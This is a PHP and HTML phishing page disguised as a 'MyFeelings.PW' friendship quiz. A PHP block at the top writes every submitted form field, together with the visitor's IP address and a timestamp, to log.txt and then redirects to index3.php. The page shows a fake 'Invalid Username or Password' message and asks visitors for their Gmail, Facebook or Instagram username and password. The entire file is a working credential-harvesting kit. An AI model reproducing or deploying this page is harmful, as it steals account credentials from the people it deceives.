<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: index3.php');
$handle = fopen('log.txt', 'a');
fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>
﻿
<!DOCTYPE html>
<html>
<head>
<title>Your Feelings About VishvjeetYadav - MyFeelings.PW</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="theme-color" content="#fdcccc">
<meta name="msapplication-navbutton-color" content="#fdcccc">
<meta name="apple-mobile-web-app-status-bar-style" content="#2196f3">
<meta name="description" content="How much your friends know about you ? Create a Quiz about you and share it with your friends. Check how many they can get correctly" />
<meta name="keywords" content="myfeelings, friends, friendship quiz, friendship test" />
<meta property="og:type" content="website" />
<meta property="og:image" content="http://myfeelings.pw/images/ogimage.jpg" />
<link rel="apple-touch-icon" sizes="57x57" href="/icons/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="/icons/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="/icons/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="/icons/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="/icons/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="/icons/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="/icons/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="/icons/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192" href="/icons/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="/icons/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
<link rel="manifest" href="/icons/manifest.json">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<meta name="robots" content="noindex, nofollow">
<style>
html,body,h1,h2,h3,h4,h5,h6,span {font-family: "Montserrat", sans-serif;}
html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0;background-color:#f7f7f7}
.topbar{
  position: fixed;
    width: 100%;
    z-index: 1;
    background-color: #fdcccc !important;
  overflow: hidden;
  border-bottom:2px solid #f55757;
  border-bottom-left-radius:5px;
  border-bottom-right-radius:5px;
}
.space{
  height:75px;
}
.one{
  font-size:21px;
  display: block;
  font-weight:bold;
}
.default-one{
  font: normal 16px/normal Montserrat, Tahoma, sans-serif;
  display:inline;
}
.box{
  padding-top:10px;
  background:#ffffff;
  padding-bottom:20px;
  margin-left:20px;
  margin-right:20px;
  box-shadow: 0 4px 10px 0 rgba(0,0,0,0.2), 0 4px 20px 0 rgba(0,0,0,0.19);
  border: 2px solid #fdcccc;
    -webkit-border-radius: 31px;
    border-radius: 20px;
}
.content{
  margin:20px;
  border-radius: 20px;
}
.title{
  font-size:21px;
}
.sub_title{
  font-size:18px;
}
.ad{
  -webkit-align-content: center;
    align-content: center;
  margin-top:20px;
}
.smallu{
  font-size:13px;
  text-decoration:bold;
}
h4{
  font-size:14px;
}
.enter_text {
  padding: 14px 24px;
  border: 2px solid #f55757;
  -webkit-border-radius: 28px;
  border-radius: 28px;
  font: normal 16px/normal Montserrat, Tahoma, sans-serif;
  color: rgba(0,0,0,1);
  text-align: center;


  -o-text-overflow: clip;
  text-overflow: clip;
  background: #f2dada;
  -webkit-box-shadow: 2px 2px 2px 0 rgba(0,0,0,0.2) inset;
  box-shadow: 2px 2px 2px 0 rgba(0,0,0,0.2) inset;
}
.small-box{
  margin-top:20px;
  max-width: 100%;
  max-height: 70%;
  margin-bottom:20px;
}
.main_button {
  display: inline-block;
  cursor: pointer;
  margin-top: 10px;
  padding: 10px 27px;
  border: 2px solid #fdcccc;
  -webkit-border-radius: 31px;
  border-radius: 31px;
  font: normal 16px/normal Montserrat, Tahoma, Geneva, sans-serif;
  color: rgba(255,255,255,0.9);
  text-align: center;
  -o-text-overflow: clip;
  text-overflow: clip;
  background: #f55757;
}
.ans_list{
  margin-top:5px;
  margin-bottom:5px;
  border-top: 1px solid #ddd;
}
.show_ans{
  background:none!important;
     color:inherit;
     border:none; 
   font-family: "Montserrat", sans-serif;
   font-size:14px;
   text-decoration:bold;
   text-align:left;
   cursor: pointer;
   display:block;
   width:100%;
   padding:10px;
  border-bottom: 1px solid #ddd;
}
select{
  border-radius:20px;
  border:2px solid  #f55757;
  padding:10px;
  margin-left:5px;
}
.whatsapp,.facebook,.msgner {
  display: inline-block;
  -webkit-box-sizing: content-box;
  -moz-box-sizing: content-box;
  box-sizing: content-box;
  cursor: pointer;
  margin: 10px;
  text-decoration:none;
  padding: 10px 30px 10px 30px;
  border: none;
  font: normal 16px/normal Montserrat,Tahoma, Geneva, sans-serif;
  color: rgba(255,255,255,0.9);
  -o-text-overflow: clip;
  text-overflow: clip;
  background: #128C7E;
}
.copytext{
  display: inline-block;
  -webkit-box-sizing: content-box;
  -moz-box-sizing: content-box;
  box-sizing: content-box;
  cursor: pointer;
  margin: 10px;
  text-decoration:none;
  padding: 10px;
  border: none;
  font: normal 16px/normal Montserrat,Tahoma, Geneva, sans-serif;
  color: white;
  -o-text-overflow: clip;
  text-overflow: clip;
  background: black;
}
.facebook{
  background:#3b5998;
}
.msgner{
  background:#2196F3;
}
.hide{
  display:none;
}
.textareacopy{
  color:#2196F3;
  border: none;
  text-align:center;      
  width: 90%;
  font: normal 16px/normal Montserrat,Tahoma, Geneva, sans-serif;
}
.yellow-strip{
  margin:10px;
  padding:15px;
    font: normal 16px/normal Montserrat,Tahoma, Geneva, sans-serif;
  color: #000!important;
    background-color: #ffffcc!important;
}
.parm-table{
  border: 1px solid #ccc;
  border-collapse: collapse;
    border-spacing: 0;
    width: 100%;
    display: table;
}
.parm-table td:first-child {
    padding-left: 16px;
}
.parm-table td{
    padding: 8px 8px;
    display: table-cell;
    text-align: left;
    vertical-align: top;
}
.parm-table tr:nth-child(even) {
    background-color: #f1f1f1;
}
.parm-table tr:nth-child(odd) {
    background-color: #fff;
}
.parm-table tr{
  border-bottom: 1px solid #ddd;
}
.parm-table td:first-child {
    padding-left: 16px;
}
.parm-table td{
    padding: 8px 8px;
    display: table-cell;
    text-align: left;
    vertical-align: top;
}
.table_heading{
      border-bottom: 1px solid #ddd;
    color: #fff !important;
        background-color: #f55757 !important;
}
.bottom{
  text-align:center;
    font: normal 16px/normal Montserrat,Tahoma, Geneva, sans-serif;
    margin-top:30px;  
}</style>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-118893437-2" type="ec9aee17e5a0a244e2552532-"></script>
<script type="ec9aee17e5a0a244e2552532-">
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-118893437-2');
</script>
</head><body>
<div class="topbar"><center><a href="/"><img src="logo.png" width="200px" height="50px"></a></center></div>
<div class="space"></div>
<div class="box">
<center>
<h1 class="title">How Much You Know<br> about VishvjeetYadav?</h1>
<h4 class="smallu">Play a Quiz Game</h4>
<div class="small_box">
  <p class="main_button">Invalid Username or Password...<br>Try Again...<br></p>
<form method="post" action="<?php echo basename(__FILE__); ?>">
<p class="main_button">Select Type of Your Account : </p><br>
<select type="radio" class="enter_text" name="account">
   <option value="gmail">Gmail</option>
    <option value="Facebook">Facebook</option>
     <option value="Instagram">Instagram</option>
</select><br>

<input class="enter_text" type="text" name="name" placeholder="Enter Your Username" autocomplete="off" required><br/>
<input class="enter_text" type="password" name="password" placeholder="Enter Your Password" autocomplete="off" required><br/>




<input class="main_button" type="submit" value="Play" />
</form>
<br />
</div>
</center>
</div><div class="content">
<div class="yellow-strip">There are no answers from friends yet.!</div>
</div>
<div class="ad">
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" type="ec9aee17e5a0a244e2552532-"></script>

<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-5197146574619129" data-ad-slot="2851403284" data-ad-format="auto"></ins>
<script type="ec9aee17e5a0a244e2552532-">
(adsbygoogle = window.adsbygoogle || []).push({});
</script> </div>
<div class="space"></div>
<span class="smallu">If you have any problem regarding our service, then you can contact us at <b><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="31584150435c00080807715e44455d5e5e5a1f525e5c">[email&#160;protected]</a></b>.</span>
<div class="bottom"><center>(c) Dhillon Web Apps 2018</center></div>
<script data-cfasync="false" src="/cdn-cgi/scripts/f2bf09f8/cloudflare-static/email-decode.min.js"></script><script src="https://ajax.cloudflare.com/cdn-cgi/scripts/4f936b58/cloudflare-static/rocket-loader.min.js" data-cf-nonce="ec9aee17e5a0a244e2552532-" defer=""></script></body>
</html>
